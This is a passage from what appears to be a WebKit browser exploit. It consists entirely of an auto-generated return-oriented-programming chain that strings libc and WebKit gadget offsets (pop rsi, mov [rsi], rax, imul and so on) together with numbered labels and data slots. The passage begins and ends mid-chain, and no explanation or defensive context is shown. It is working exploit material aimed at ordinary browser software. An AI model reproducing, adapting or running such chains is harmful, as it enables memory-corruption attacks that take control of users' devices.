libc_base+793877, //pop rsi
ropchain+103000, //L970
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+103016, //L971
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L970:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L971:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+103104, //L972
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L972:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+103160, //L975
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L975:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+103232, //L976
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L976:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+103288, //L979
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L979:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+103392, //L982
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L981:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L982:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+103480, //L983
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+103496, //L985
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L983:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L985:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+103640, //L988
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+103608, //L986
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+103624, //L987
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L986:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L987:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L988:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+103712, //L989
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L989:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+103768, //L992
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L992:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+103848, //L993
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L993:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L994:
db([4, 0]); // 0x4
set_gadget(libc_base+792472,); //pop rcx
//L995:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+103952, //L996
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+103968, //L997
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L996:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L997:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+104056, //L998
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L998:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+104112, //L1001
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1001:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+104232, //L1004
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1003:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1004:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+104320, //L1005
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+104336, //L1007
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1005:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1007:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+104480, //L1010
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+104448, //L1008
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+104464, //L1009
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1008:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1009:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1010:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+104552, //L1011
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1011:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+104608, //L1014
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1014:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+104688, //L1015
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1015:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1016:
db([18, 0]); // 0x12
set_gadget(libc_base+792472,); //pop rcx
//L1017:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+104792, //L1018
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+104808, //L1019
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1018:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1019:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+104896, //L1020
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1020:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+104952, //L1023
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1023:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+105024, //L1024
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1024:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+105080, //L1027
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1027:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1028:
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+105232, //L1031
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1030:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1031:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+105320, //L1032
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+105336, //L1034
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1032:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1034:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+105480, //L1037
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+105448, //L1035
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+105464, //L1036
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1035:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1036:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1037:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+105552, //L1038
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1038:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+105608, //L1041
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1041:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+105688, //L1042
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1042:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1043:
db([19, 0]); // 0x13
set_gadget(libc_base+792472,); //pop rcx
//L1044:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+105792, //L1045
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+105808, //L1046
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1045:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1046:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+105896, //L1047
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1047:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+105952, //L1050
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1050:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+106024, //L1051
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1051:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+106080, //L1054
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1054:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1055:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+106232, //L1058
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1057:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1058:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+106320, //L1059
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+106336, //L1061
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1059:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1061:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+106480, //L1064
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+106448, //L1062
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+106464, //L1063
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1062:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1063:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1064:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+106552, //L1065
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1065:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+106608, //L1068
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1068:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+106688, //L1069
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1069:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1070:
db([20, 0]); // 0x14
set_gadget(libc_base+792472,); //pop rcx
//L1071:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+106792, //L1072
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+106808, //L1073
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1072:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1073:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+106896, //L1074
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1074:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+106952, //L1077
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1077:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+107024, //L1078
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1078:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+107080, //L1081
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1081:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1082:
libc_base+793877, //pop rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+107232, //L1085
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1084:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1085:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+107320, //L1086
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+107336, //L1088
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1086:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1088:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+107480, //L1091
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+107448, //L1089
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+107464, //L1090
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1089:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1090:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1091:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+107552, //L1092
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1092:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+107608, //L1095
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1095:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+107688, //L1096
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1096:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1097:
db([21, 0]); // 0x15
set_gadget(libc_base+792472,); //pop rcx
//L1098:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+107792, //L1099
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+107808, //L1100
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1099:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1100:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+107896, //L1101
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1101:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+107952, //L1104
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1104:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+108024, //L1105
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1105:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+108080, //L1108
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1108:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+108184, //L1111
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1110:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L1111:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+108272, //L1112
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+108288, //L1114
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1112:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1114:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+108432, //L1117
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+108400, //L1115
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+108416, //L1116
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1115:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1116:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1117:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+108504, //L1118
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1118:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+108560, //L1121
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1121:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+108640, //L1122
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1122:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1123:
db([3, 0]); // 0x3
set_gadget(libc_base+792472,); //pop rcx
//L1124:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+108744, //L1125
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+108760, //L1126
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1125:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1126:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+108848, //L1127
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1127:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+108904, //L1130
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1130:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+109024, //L1133
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1132:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1133:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+109112, //L1134
